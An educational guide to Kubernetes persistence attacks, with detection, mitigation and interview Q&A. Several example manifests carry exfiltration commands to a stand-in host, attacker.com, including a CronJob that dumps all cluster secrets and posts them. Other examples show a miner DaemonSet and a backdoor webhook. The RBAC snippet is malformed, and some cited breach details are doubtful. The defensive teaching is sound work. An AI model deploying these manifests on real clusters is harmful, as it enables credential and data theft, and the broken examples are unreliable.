# 01.05 - Persistence Attacks

## 1️⃣ What This Topic Is

Persistence Attacks examines how attackers maintain unauthorized access to Kubernetes clusters after initial compromise, understanding persistence mechanisms, detection techniques, and mitigation strategies.

**What this means:**
- Persistence = maintaining access over time
- Attacker wants to maintain presence even after detection/remediation
- Multiple persistence mechanisms in Kubernetes
- Understanding persistence helps detect and prevent long-term compromise

**The Key Concepts:**

1. **Persistence Types**
   - Cluster-level (control plane)
   - Node-level (worker nodes)
   - Namespace-level (specific workloads)
   - Pod-level (container persistence)
   - Supply chain (image/dependency persistence)

2. **Persistence Mechanisms**
   - DaemonSets (cluster-wide deployment)
   - CronJobs (periodic execution)
   - Modified Deployments (malicious sidecars, configMaps)
   - Secret access (credential harvesting)
   - Backdoors (webhooks, controllers, K8s API)

**Why this matters:**
- Persistence enables long-term attacks
- Detection becomes difficult
- Data exfiltration over extended periods
- Cryptojacking (resource theft)
- Cluster backdoors for future attacks

---

## 2️⃣ What Problem It Solves

### Problem 1: Transient vs. Persistent Threats

**Without understanding persistence:**
- Assume one-time attack vectors
- Don't monitor for long-term compromise
- Miss ongoing data theft
- Assume breach is over after initial response

**With persistence understanding:**
- Recognize attackers want to maintain access
- Monitor for persistence mechanisms
- Detect ongoing compromise
- Understand breach is ongoing event

### Problem 2: Invisible Persistence Mechanisms

**Without understanding persistence:**
- Can't detect hidden persistence
- Attackers maintain access undetected
- Continuous data exfiltration
- Repeated cryptojacking

**With persistence understanding:**
- Know all persistence mechanisms
- Monitor for DaemonSets, CronJobs, modified deployments
- Detect webhook modifications
- Identify secret harvesting attempts

### Problem 3: Incomplete Incident Response

**Without understanding persistence:**
- Remove malicious pods, but attacker returns
- Don't identify how attacker regained access
- Repeated incidents, no resolution
- Never fully remediate compromise

**With persistence understanding:**
- Identify persistence mechanism used
- Remove all artifacts of persistence
- Close initial access vector
- Prevent re-compromise

### Real-World Impact

**Example: Jira Data Breach (2015)**
- **Vulnerability**: Attacker used web shell for persistence
- **Root cause**: No detection of persistent backdoor
- **Persistence issue**: Web shell allowed ongoing access
- **Impact**: Attacker maintained access for weeks, extracted data
- **Lesson**: Monitor for persistence mechanisms, detect web shells

**Example: Target Data Breach (2013)**
- **Vulnerability**: Attacker used stolen credentials for persistence
- **Root cause**: No credential rotation after breach
- **Persistence issue**: Credentials remained valid
- **Impact**: Attacker maintained access for months
- **Lesson**: Rotate credentials immediately after breach

**Example: Kubernetes Cryptojacking (2018)**
- **Vulnerability**: Attacker used DaemonSet for persistence
- **Root cause**: No monitoring of new DaemonSets
- **Persistence issue**: DaemonSet provided cluster-wide miner
- **Impact**: Resource theft across entire cluster
- **Lesson**: Monitor DaemonSets, implement resource monitoring

## 4️⃣ How It Works (Conceptual)

### Persistence Mechanisms in Kubernetes

**1. DaemonSet Persistence**
- **Purpose**: Deploy workload on every node
- **Attacker Use**: Deploy miner or backdoor to all nodes
- **Detection Challenge**: DaemonSets can be legitimate
- **Example**: Malicious DaemonSet with cryptocurrency miner on all nodes

**Attack Flow:**
```
Attacker creates DaemonSet → Scheduler schedules to all nodes → Kubelet creates pod on each node → Malicious container runs on every node → Attacker maintains cluster-wide persistence
```

**Detection:**
- Monitor for new DaemonSets
- Check DaemonSet image hashes
- Monitor resource usage (unusual CPU/memory)
- Scan DaemonSet pods for vulnerabilities

**Mitigation:**
- RBAC to prevent DaemonSet creation
- Admission controller to validate DaemonSets
- Network policies to limit DaemonSet communication
- Resource quotas to prevent cryptojacking

**Example:**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: malicious-daemonset
  labels:
    app: crypto-miner
spec:
  selector:
    matchLabels:
      name: malicious-daemonset
  template:
    metadata:
      labels:
        name: miner-pod
    spec:
      containers:
      - name: miner
        image: malicious:miner:latest
        resources:
          limits:
            cpu: "1"
            memory: "2Gi"
```

**2. CronJob Persistence**
- **Purpose**: Execute workload periodically
- **Attacker Use**: Schedule data exfiltration, malware updates
- **Detection Challenge**: CronJobs can be legitimate
- **Example**: CronJob that exfiltrates data every hour

**Attack Flow:**
```
Attacker creates CronJob → Scheduler executes periodically → Kubelet creates pod → Malicious container runs → Attacker maintains periodic persistence → Data exfiltrated over time
```

**Detection:**
- Monitor for new CronJobs
- Check CronJob image hashes
- Monitor CronJob execution (unusual patterns)
- Review CronJob schedules (unusual timing)

**Mitigation:**
- RBAC to prevent CronJob creation
- Admission controller to validate CronJobs
- Monitor CronJob execution patterns
- Scan CronJob images

**Example:**
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: malicious-cronjob
spec:
  schedule: "0 * * * *"  # Every hour
  successfulJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: exfiltrator
            image: malicious:exfiltrator:latest
            command:
            - /bin/sh
            - -c
            - "curl -X POST -d @/data http://attacker.com/exfiltrate"
            restartPolicy: OnFailure
```

**3. Modified Deployment Persistence**
- **Purpose**: Modify existing deployment to include malicious sidecar
- **Attacker Use**: Inject backdoor into production deployment
- **Detection Challenge**: Modified deployment looks like production
- **Example**: Deployment with malicious sidecar added via configMap update

**Attack Flow:**
```
Attacker accesses API Server (compromised credentials) → Modifies deployment spec to add malicious sidecar → Controller updates deployment → New pods created with backdoor → Attacker maintains persistence (looks like production) → Backdoor exfiltrates data
```

**Detection:**
- Monitor for deployment modifications
- Check deployment spec changes (unexpected sidecars)
- Monitor pod creation patterns
- Audit log for deployment updates

**Mitigation:**
- RBAC to prevent deployment modifications
- Admission controller to validate deployment changes
- Audit logging for all deployment modifications
- Require approval for production deployment changes

**Example:**
```yaml
# Original deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  labels:
    app: web-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      containers:
      - name: web-server
        image: nginx:1.25-alpine
---
# Attacker-modified deployment (malicious sidecar)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  labels:
    app: web-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web-app
  template:
    metadata:
      labels:
        app: web-app
    spec:
      containers:
      - name: web-server
        image: nginx:1.25-alpine
      - name: malicious-sidecar  # ATTACKER ADDED
        image: malicious:backdoor:latest
        volumeMounts:
        - name: webapp-logs
          mountPath: /var/log/nginx
```

**4. Secret Harvesting Persistence**
- **Purpose**: Read secrets from etcd/pods to maintain access
- **Attacker Use**: Harvest credentials for future access
- **Detection Challenge**: Legitimate applications read secrets
- **Example**: CronJob that reads all secrets and sends to attacker server

**Attack Flow:**
```
Attacker creates CronJob → CronJob lists all secrets → CronJob reads secret values → CronJob sends secrets to attacker server → Attacker maintains persistence (even if pods are removed) → Attacker uses harvested credentials to regain access
```

**Detection:**
- Monitor secret access (audit logs)
- Alert on unusual secret reading patterns
- Monitor for secret access from unexpected pods
- Track secret modification patterns

**Mitigation:**
- RBAC to limit secret reading
- Secret encryption at rest
- Audit secret access logs
- Implement external secret management

**Example:**
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: secret-harvester
spec:
  schedule: "0 */6 * * *"  # Every 6 hours
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: sa-with-secret-access  # Attacker needs secret access
          containers:
          - name: harvester
            image: busybox:1.36
            command:
            - /bin/sh
            - -c
            - |
              echo "Harvesting secrets..."
              kubectl get secrets -A -o json > /tmp/secrets.json
              curl -X POST -d @/tmp/secrets.json http://attacker.com/harvest
```

**5. Webhook Persistence**
- **Purpose**: Maintain persistence via webhook
- **Attacker Use**: Inject malicious webhooks, modify webhook responses
- **Detection Challenge**: Webhooks intercept all API requests
- **Example**: Malicious mutating webhook that adds backdoor to all pods

**Attack Flow:**
```
Attacker creates malicious webhook → Attacker applies webhook configuration → API Server sends requests to webhook → Webhook modifies requests (adds backdoor) → Webhook returns modified response → Attacker maintains persistence (all pods have backdoor) → Attacker exfiltrates data via backdoor
```

**Detection:**
- Monitor for new webhooks
- Check webhook image hashes
- Monitor webhook response times (unusual delays)
- Audit webhook configurations

**Mitigation:**
- RBAC to prevent webhook creation
- Admission controller to validate webhook configurations
- Monitor webhook behavior
- Scan webhook images

**Example:**
```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: malicious-webhook
webhooks:
- name: backdoor-injector
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  clientConfig:
    service:
      name: malicious-webhook-service
      namespace: attacker-namespace
    caBundle: LS0tLS0tCg==
```

**6. K8s API Persistence**
- **Purpose**: Maintain persistence via K8s API
- **Attacker Use**: Create custom resources, modify existing resources
- **Detection Challenge**: K8s API is powerful, hard to monitor
- **Example**: Custom CRD with backdoor controller

**Attack Flow:**
```
Attacker creates CRD → Attacker creates custom controller for CRD → Controller watches for CR instances → Attacker creates CR instance → Controller executes malicious action (backdoor) → Attacker maintains persistence (CR acts as backdoor)
```

**Detection:**
- Monitor for new CRDs (Custom Resource Definitions)
- Monitor for new controllers
- Monitor for unusual API calls to custom resources
- Audit custom resource creation

**Mitigation:**
- RBAC to prevent CRD creation
- RBAC to prevent controller creation
- Audit logging for CRD/controller operations
- Require approval for CRD creation

**Example:**
```yaml
# CRD definition (attacker-created)
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: backdoors.attacker.com
spec:
  group: attacker.com
  versions:
  - name: v1
    served: true
    storage: true
    schema:
      openAPIV3Schema:
        type: object
        properties:
          spec:
            type: object
            properties:
              command:
                type: string
---
# Attacker creates CR instance (backdoor)
apiVersion: attacker.com/v1
kind: Backdoor
metadata:
  name: execute-command
spec:
  command: "curl -X POST -d @/etc/hosts http://attacker.com/exfiltrate"
---
# Attacker controller monitors CRs and executes commands
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-controller
  namespace: kube-system  # Or attacker namespace
spec:
  replicas: 1
  selector:
    matchLabels:
      app: backdoor-controller
  template:
    spec:
      containers:
      - name: controller
        image: attacker:backdoor-controller:latest
        command:
        - /controller
```

**7. Image Supply Chain Persistence**
- **Purpose**: Maintain persistence via compromised container images
- **Attacker Use**: Plant backdoor in base image or dependency
- **Detection Challenge**: Image is built legitimately, hard to detect
- **Example**: Malicious code in popular nginx image (if not from official registry)

**Attack Flow:**
```
Attacker compromises image registry or build pipeline → Attacker modifies base image or dependency → Image is built and pushed to registry → User deploys application using compromised image → Attacker maintains persistence (backdoor in image) → Attacker accesses cluster via backdoor
```

**Detection:**
- Scan images for vulnerabilities
- Use image signing and verification
- Verify image digests
- Monitor image pull patterns
- Use private image registry

**Mitigation:**
- Use official, signed images
- Scan images before deployment
- Use minimal, updated base images
- Implement supply chain security
- Use SBOM (Software Bill of Materials)

**Example:**
```yaml
# Deployment using compromised image
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: web-app
  template:
    spec:
      containers:
      - name: web-server
        image: nginx:backdoored:1.25-alpine  # COMPROMISED IMAGE
        ports:
        - containerPort: 80
# Attacker connects to backdoor port (configured in malicious image)
```

### Persistence Detection Techniques

**1. Behavioral Monitoring**
- Monitor for unusual patterns
- Detect anomalies in DaemonSet/CronJob creation
- Identify unexpected resource usage
- Track secret access patterns

**2. File Integrity Monitoring (FIM)**
- Monitor file system changes on control plane and worker nodes
- Detect modifications to Kubelet, container runtime, etcd
- Identify unauthorized configuration changes

**3. Network Monitoring**
- Monitor for unusual network traffic
- Detect data exfiltration (large outbound transfers)
- Identify connections to attacker C2 servers
- Monitor for persistence-related network activity

**4. Process Monitoring**
- Monitor processes on nodes
- Detect malicious processes
- Identify unusual process execution patterns
- Monitor for crypto mining processes

**5. Audit Log Analysis**
- Monitor audit logs for suspicious activities
- Detect persistence-related API calls (DaemonSet, CronJob creation)
- Identify unusual access patterns
- Monitor for secret access

### **2. Applying Persistence Mitigation**

**Example: Implementing RBAC to Prevent DaemonSet Creation**

```bash
echo "=== RBAC for DaemonSet Prevention ==="

# 1. Create Role that cannot create DaemonSets
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1

metadata:
  name: developer-role

- apiGroups: ["apps"]
  resources: ["deployments", "services"]

- apiGroups: ["apps"]
  resources: ["deployments", "statefulsets"]
```

### **Common Mistakes in Persistence Detection/Mitigation**

❌ **Mistake 1**: Not monitoring for persistence
- Reality: Attackers use persistence to maintain access
- Fix: Monitor for DaemonSets, CronJobs, deployment modifications

❌ **Mistake 2**: Assuming DaemonSets are always legitimate
- Reality: DaemonSets are common persistence mechanism
- Fix: Review all DaemonSets, validate image hashes

❌ **Mistake 3**: Not auditing secret access
- Reality: Secret harvesting provides long-term persistence
- Fix: Monitor secret access logs, restrict secret reading

❌ **Mistake 4**: Not implementing RBAC to prevent DaemonSet creation
- Reality: RBAC is effective control against persistence
- Fix: Restrict DaemonSet/CronJob creation to admins only

### **Common Interview Questions**

**Q1: What are common persistence mechanisms in Kubernetes?**
**Good Answer**: Common persistence mechanisms in Kubernetes include:

1. **DaemonSets**: Deploy workload on every node in cluster
   - Used for crypto mining, backdoors, malware deployment
   - Provides cluster-wide persistence

2. **CronJobs**: Schedule periodic execution
   - Used for data exfiltration, malware updates, credential harvesting
   - Provides periodic persistence

3. **Modified Deployments**: Inject malicious sidecars into production deployments
   - Used for backdoors, data exfiltration
   - Provides persistence that looks like production

4. **Secret Harvesting**: Read secrets from etcd/pods
   - Used for credential harvesting, future access
   - Provides persistence even if pods are removed

5. **Webhooks**: Intercept and modify API requests
   - Used for backdoors, request tampering
   - Provides cluster-wide control of all API requests

6. **K8s API**: Custom resources and controllers
   - Used for backdoors, command and control
   - Provides powerful persistence mechanism

Each mechanism allows attacker to maintain unauthorized access to cluster.

**Q2: How do you detect persistence in Kubernetes?**
**Good Answer**: Persistence detection in Kubernetes includes:

1. **Behavioral Monitoring**: Monitor for unusual patterns
   - New DaemonSets/CronJobs (check necessity)
   - Deployment modifications (check for unexpected sidecars)
   - Unusual resource usage (crypto mining)

2. **Resource Monitoring**: Detect crypto mining
   - High CPU usage on all nodes
   - High memory usage
   - Network connections to mining pools

3. **Network Monitoring**: Detect data exfiltration
   - Large outbound transfers
   - Connections to known C2 servers
   - Unusual network patterns

4. **Process Monitoring**: Detect malicious processes
   - Mining processes (xmrig, etc.)
   - Backdoor processes
   - Unusual process execution

5. **Audit Log Analysis**: Review API calls
   - DaemonSet/CronJob creation
   - Deployment modifications
   - Secret access patterns
   - Unusual access patterns

6. **File Integrity Monitoring**: Detect system modifications
   - Kubelet modifications
   - Container runtime modifications
   - etcd modifications

Detection tools: Falco, Prometheus, audit logging, FIM solutions.

**Q3: How do you mitigate persistence attacks in Kubernetes?**
**Good Answer**: Persistence mitigation in Kubernetes includes:

1. **RBAC (Least Privilege)**:
   - Restrict DaemonSet/CronJob creation to admins only
   - Restrict deployment modifications
   - Restrict secret reading
   - Regular RBAC reviews

2. **Admission Controllers**:
   - Validate DaemonSets before creation
   - Validate CronJobs before creation
   - Validate deployment modifications
   - Implement image scanning policies

3. **Network Policies**:
   - Limit DaemonSet communication
   - Limit CronJob communication
   - Implement default-deny with explicit allow

4. **Security Contexts**:
   - Run as non-root
   - Drop all capabilities
   - Read-only filesystem
   - Seccomp/AppArmor profiles

5. **Resource Quotas**:
   - Limit resource consumption
   - Prevent crypto mining
   - Prevent resource exhaustion

6. **Monitoring and Alerting**:
   - Monitor for persistence mechanisms
   - Alert on unusual activity
   - Implement SIEM integration

7. **Supply Chain Security**:
   - Scan images for vulnerabilities
   - Use signed images
   - Implement SBOM
   - Secure build pipeline

8. **Incident Response**:
   - Document persistence removal procedures
   - Implement credential rotation procedures
   - Conduct regular incident response drills

Combined approach provides defense in depth against persistence attacks.

**Q4: What's the most dangerous persistence mechanism in Kubernetes?**
**Good Answer**: The most dangerous persistence mechanisms are:

1. **DaemonSets**: Because they provide cluster-wide control
   - Immediate persistence on all nodes
   - Can deploy any workload to entire cluster
   - Resource theft across cluster

2. **Webhooks**: Because they intercept all API requests
   - Cluster-wide control of all Kubernetes objects
   - Can modify any request/response
   - Backdoors are invisible to applications

3. **Supply Chain**: Because it's difficult to detect
   - Images appear legitimate
   - Backdoors are built into images
   - Hard to scan for malicious code

4. **K8s API**: Because it's very powerful
   - Can create custom resources
   - Can implement controllers
   - Hard to monitor custom resources

DaemonSets are most dangerous for cryptojacking. Webhooks are most dangerous for cluster compromise. Supply chain is most dangerous for backdoors.

**Q5: How does incident response differ for persistence attacks?**
**Good Answer**: Incident response for persistence attacks differs because:

1. **Identify Persistence Mechanism**: Determine how attacker is maintaining access
   - DaemonSet, CronJob, modified deployment, webhook, etc.
   - This determines removal procedure

2. **Remove All Artifacts**: Remove all persistence artifacts
   - Delete malicious DaemonSets/CronJobs
   - Remove malicious sidecars from deployments
   - Delete malicious webhooks
   - Remove malicious controllers

3. **Close Initial Access Vector**: Prevent re-compromise
   - Rotate all credentials
   - Fix vulnerability that was exploited
   - Review and tighten security controls

4. **Monitor for Recurrence**: Attacker may use other persistence mechanisms
   - Enhanced monitoring
   - Threat hunting
   - Regular reviews

5. **Document and Learn**: Document incident for future prevention
   - Update threat model
   - Implement additional security controls
   - Conduct post-mortem

6. **Communicate with Stakeholders**: Keep management informed
   - Provide regular updates
   - Document impact and remediation
   - Share lessons learned

Persistence incidents require thorough investigation, complete artifact removal, and enhanced monitoring to prevent recurrence.
